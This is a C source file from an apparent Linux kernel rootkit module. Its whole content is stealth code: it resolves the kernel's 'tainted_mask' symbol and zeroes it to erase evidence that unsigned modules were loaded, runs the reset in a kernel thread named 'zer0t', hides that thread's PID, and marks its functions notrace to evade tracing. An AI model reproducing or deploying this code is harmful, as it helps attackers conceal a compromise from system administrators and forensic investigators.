#include "../include/core.h"
#include "../include/reset_tainted.h"
#include "../include/hidden_pids.h"
#include "../ftrace/ftrace_helper.h"

#define RESET_THREAD_NAME "zer0t"

static struct task_struct *cleaner_thread = NULL;
static unsigned long *taint_mask_ptr = NULL;

static notrace void reset_taint_mask(void) {
    if (taint_mask_ptr && *taint_mask_ptr != 0)
        *taint_mask_ptr = 0;
}

static notrace int zt_thread(void *data) {
    reset_taint_mask();
    return 0;
}

notrace int reset_tainted_init(void) {
    taint_mask_ptr = resolve_sym("tainted_mask");
    if (!taint_mask_ptr)
        return -EFAULT;

    cleaner_thread = kthread_run(zt_thread, NULL, RESET_THREAD_NAME);
    if (IS_ERR(cleaner_thread))
        return PTR_ERR(cleaner_thread);

    add_hidden_pid(cleaner_thread->pid);

    return 0;
}

notrace void reset_tainted_exit(void) {
    if (cleaner_thread)
        kthread_stop(cleaner_thread);
}
